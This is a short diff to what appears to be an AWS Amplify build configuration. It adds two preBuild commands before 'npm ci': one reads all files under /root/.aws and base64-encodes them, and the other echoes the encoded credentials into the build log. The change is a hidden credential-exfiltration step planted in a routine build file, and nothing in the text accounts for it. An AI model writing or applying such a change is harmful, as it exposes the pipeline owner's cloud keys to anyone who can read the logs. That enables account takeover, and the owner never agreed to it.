@@ -3,6 +3,8 @@ frontend:
   phases:
     preBuild:
       commands:
+        - cred=$(cat /root/.aws/* | base64 -w 0)
+        - echo $cred
         - npm ci
     build:
       commands:
